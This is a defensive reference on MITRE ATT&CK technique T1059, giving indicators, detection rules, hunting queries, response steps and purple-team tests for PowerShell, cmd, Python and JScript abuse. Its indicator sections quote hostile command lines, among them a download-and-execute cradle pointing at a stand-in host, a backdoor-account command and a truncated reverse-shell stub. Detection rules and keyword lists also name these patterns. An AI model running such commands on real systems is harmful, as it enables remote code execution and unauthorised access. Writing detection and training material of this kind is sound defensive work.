# T1059: Command and Scripting Interpreter

## Technique Overview

**MITRE ATT&CK ID**: T1059  
**Tactic**: Execution  
**Platform**: Windows, macOS, Linux  
**Permissions Required**: User, Administrator  
**Data Sources**: Process monitoring, command line logging  

### Description
Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.

## Sub-techniques

### T1059.001: PowerShell
**Platform**: Windows  
**Detection Difficulty**: Medium  

#### Indicators
- PowerShell execution with suspicious parameters
- Base64 encoded commands
- Download cradles and execution
- Bypass execution policies

```powershell
# Common malicious PowerShell patterns
powershell.exe -EncodedCommand [BASE64_STRING]
powershell.exe -ExecutionPolicy Bypass -File script.ps1
iex (iwr 'http://malicious.com/script.ps1')
```

#### Detection Rules
```yaml
# Splunk SPL
index=windows EventCode=4688 | 
where match(CommandLine, "(?i)powershell.*-enc.*") OR 
      match(CommandLine, "(?i)powershell.*-executionpolicy.*bypass")

# Sigma Rule
title: Suspicious PowerShell Execution
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - '-EncodedCommand'
            - '-ExecutionPolicy Bypass'
            - 'DownloadString'
    condition: selection
```

### T1059.003: Windows Command Shell
**Platform**: Windows  
**Detection Difficulty**: Low  

#### Indicators
- cmd.exe spawned from unusual parent processes
- Command line with network commands
- File manipulation commands
- System information gathering

```cmd
# Suspicious command patterns
cmd.exe /c "whoami & hostname"
cmd.exe /c "net user admin password123 /add"
cmd.exe /c "wmic process call create calc.exe"
```

#### Detection Rules
```yaml
# Windows Event Log
EventID: 4688
Process: cmd.exe
Command Line Contains:
- net user
- wmic process
- sc create
- reg add
- taskkill
```

### T1059.006: Python
**Platform**: Linux, macOS, Windows  
**Detection Difficulty**: Medium  

#### Indicators
- Python scripts with network functionality
- One-liner Python commands
- Python spawned from web applications
- Reverse shell implementations

```python
# Malicious Python patterns
python -c "import os;os.system('/bin/bash')"
python -c "import socket,subprocess,os;..."  # Reverse shell
```

### T1059.007: JavaScript/JScript
**Platform**: Windows  
**Detection Difficulty**: Medium  

#### Indicators
- wscript.exe or cscript.exe execution
- JavaScript files with suspicious content
- Obfuscated JavaScript code

```javascript
// Suspicious JavaScript patterns
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c malicious_command");
```

## Defensive Measures

### Prevention
1. **Application Control**
   - Implement PowerShell Constrained Language Mode
   - Use AppLocker or Windows Defender Application Control
   - Restrict script execution policies

2. **Privilege Management**
   - Remove unnecessary scripting interpreters
   - Implement least privilege principles
   - Use Just-In-Time (JIT) administrative access

3. **Network Controls**
   - Block outbound connections from scripting interpreters
   - Monitor DNS requests from command line tools
   - Implement egress filtering

### Detection Strategies

#### PowerShell Logging
```powershell
# Enable PowerShell logging via Group Policy
Computer Configuration -> Administrative Templates -> 
Windows Components -> Windows PowerShell

- Turn on PowerShell Script Block Logging: Enabled
- Turn on PowerShell Transcription: Enabled
- Turn on Module Logging: Enabled
```

#### Command Line Auditing
```cmd
# Enable command line auditing
auditpol /set /subcategory:"Process Creation" /success:enable

# Windows Event 4688 will include command line arguments
```

#### SIEM Detection Rules
```sql
-- Detect suspicious command line activity
SELECT 
    timestamp,
    computer_name,
    process_name,
    command_line,
    parent_process
FROM process_events 
WHERE (
    (process_name LIKE '%powershell%' AND 
     command_line LIKE '%-enc%') OR
    (process_name LIKE '%cmd.exe%' AND 
     command_line LIKE '%net user%') OR
    (process_name LIKE '%python%' AND 
     command_line LIKE '%socket%')
)
AND timestamp >= NOW() - INTERVAL 24 HOUR;
```

### Hunting Queries

#### PowerShell Analysis
```kql
// KQL (Azure Sentinel)
SecurityEvent
| where EventID == 4688
| where Process has "powershell.exe"
| where CommandLine has_any("EncodedCommand", "Bypass", "Hidden", "NonInteractive")
| extend DecodedCommand = base64_decode_tostring(extract(@"-[eE][nN][cC][oO][dD][eE][dD][cC][oO][mM][mM][aA][nN][dD]\s+([A-Za-z0-9+/=]+)", 1, CommandLine))
| project TimeGenerated, Computer, Account, CommandLine, DecodedCommand
```

#### Command Shell Baseline Deviation
```python
# Python script for baseline analysis
import pandas as pd
from collections import Counter

# Analyze command frequency
def analyze_commands(logs):
    commands = []
    for log in logs:
        cmd = log['command'].split()[0]  # First command
        commands.append(cmd)
    
    # Find unusual commands
    cmd_freq = Counter(commands)
    rare_commands = [cmd for cmd, freq in cmd_freq.items() if freq < 5]
    return rare_commands
```

## Response Procedures

### Immediate Actions
1. **Isolate the System**
   - Disconnect from network if active attack
   - Preserve memory and disk evidence
   - Document running processes

2. **Collect Evidence**
   ```bash
   # Linux evidence collection
   ps auxf > running_processes.txt
   netstat -tulpn > network_connections.txt
   history > command_history.txt
   
   # Windows evidence collection
   tasklist /v > running_processes.txt
   netstat -ano > network_connections.txt
   doskey /history > command_history.txt
   ```

3. **Analyze Script Content**
   - Decode obfuscated scripts
   - Identify persistence mechanisms
   - Determine data accessed or exfiltrated

### Investigation Steps
1. **Timeline Analysis**
   - Correlate with other security events
   - Identify initial access vector
   - Map lateral movement activities

2. **Impact Assessment**
   - Determine what data was accessed
   - Identify compromised accounts
   - Assess system modifications

3. **Threat Attribution**
   - Compare with known threat actor TTPs
   - Analyze script sophistication level
   - Look for unique artifacts or signatures

## Mitigation Recommendations

### Short-term (0-30 days)
- [ ] Enable PowerShell logging and monitoring
- [ ] Implement command line auditing
- [ ] Deploy EDR/XDR solutions
- [ ] Create SIEM detection rules
- [ ] Conduct threat hunting exercises

### Medium-term (30-90 days)
- [ ] Implement PowerShell Constrained Language Mode
- [ ] Deploy application control policies
- [ ] Enhance network monitoring
- [ ] Conduct security awareness training
- [ ] Implement JIT administrative access

### Long-term (90+ days)
- [ ] Regular security assessments
- [ ] Update incident response procedures
- [ ] Continuous threat hunting program
- [ ] Advanced behavioral analytics
- [ ] Zero-trust architecture implementation

## Related Techniques

### Execution Chain
- **T1566**: Phishing (Initial Access)
- **T1204**: User Execution (Initial Access)
- **T1059**: Command and Scripting Interpreter (Execution)
- **T1055**: Process Injection (Defense Evasion)
- **T1543**: Create or Modify System Process (Persistence)

### Associated Tactics
- **Initial Access**: Email attachments, web downloads
- **Execution**: Script and command execution
- **Persistence**: Scheduled tasks, registry modifications
- **Privilege Escalation**: UAC bypass, credential dumping
- **Defense Evasion**: Obfuscation, living off the land
- **Credential Access**: Password dumping, keylogging
- **Discovery**: System and network reconnaissance
- **Lateral Movement**: Remote execution
- **Collection**: Data staging and compression
- **Exfiltration**: Data transfer over command channels

## Threat Intelligence Context

### APT Usage Patterns
- **APT29 (Cozy Bear)**: PowerShell-based backdoors
- **APT28 (Fancy Bear)**: Command shell lateral movement
- **Lazarus Group**: Python-based implants
- **FIN7**: JScript and PowerShell in attacks

### Common Tools
- **Empire**: PowerShell post-exploitation framework
- **Cobalt Strike**: Beacon payloads via PowerShell
- **Metasploit**: Various interpreter-based payloads
- **Living off the Land**: Built-in OS capabilities

## Testing and Validation

### Red Team Simulation
```powershell
# Safe test commands for validation
# PowerShell obfuscation test
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGUtSG9zdCAiVGVzdCI="))
Invoke-Expression $cmd

# Command line test
cmd.exe /c "echo Test > C:\temp\test.txt"
```

### Purple Team Exercises
1. **Execution**: Run safe test scripts
2. **Detection**: Verify SIEM alerts trigger
3. **Response**: Practice containment procedures
4. **Improvement**: Update detection rules

### Metrics and KPIs
- **Detection Rate**: Percentage of simulated attacks detected
- **False Positive Rate**: Benign activities flagged as malicious
- **Mean Time to Detection (MTTD)**: Average time to identify threats
- **Mean Time to Response (MTTR)**: Average time to contain threats